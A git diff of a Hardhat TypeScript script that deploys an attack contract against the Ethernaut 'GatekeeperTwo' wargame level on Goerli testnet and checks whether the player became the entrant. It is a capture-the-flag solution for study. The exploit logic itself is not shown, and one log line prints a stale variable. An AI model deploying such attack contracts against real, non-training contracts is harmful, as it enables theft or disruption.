@@ -7,10 +7,10 @@ import { run } from "hardhat";
 
 const attackVault = async () => {
     // change contract addresses here.
-    const gateTwoAddress = "0xC1d2C999345e3E29e36B3397BED9E0ebf0414e0E"; //type "await contract.address()" in ethernaut console
-    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
+    const gateTwoAddress = "0xB9295FF890D6493F3E1a0080887cE29c41d398D1"; //type "await contract.address()" in ethernaut console
+    // const player = ""; //place your player address here (you may type player in ethernaut console)
     const args: any[] = [gateTwoAddress];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
@@ -39,11 +39,11 @@ const attackVault = async () => {
     // alternative below
     console.log("Deploying attack contract AttackGateKeeperTwo...");
     console.log("This will trigger constructor to register Player address as entrant...");
-    const Factory = await ethers.getContractFactory("AttackGateKeeperTwo", deployer);
-    const attackGateKeeperTwo = await Factory.deploy();
-    console.log(attackGateKeeperTwo);
-    console.log(`Contract deployed to ${attackGateKeeperTwo.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (
+        await ethers.getContractFactory("AttackGateKeeperTwo", player)
+    ).deploy(gateTwoAddress);
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackGateKeeperTwo.address){
     //     console.log("Verifying contract...");
@@ -61,13 +61,19 @@ const attackVault = async () => {
     //     }
     // }
 
+    // using my custom rpc stored in .env (for privacy)
+    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    const players = new ethers.Wallet(player, provider);
+    console.log("Player's address is: ", players.address);
+
     // typing all commands in console below
     // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
     console.log("Rechecking entrant...");
-    entrant = await contract.entrant();
-    console.log(`Current entrant is: ${entrant}`);
-    if (entrant === player) {
-        console.log("Done! entrant is now player, Submit to ethernaut.");
+    const newEntrant = await contract.entrant();
+    console.log(`New entrant is: ${entrant}`);
+    if (newEntrant === players.address) {
+        console.log("Congrats! Level passed since player is now the entrant, Submit to ethernaut.");
     } else {
         console.log("entrant is not player, review code above and try again...");
     }
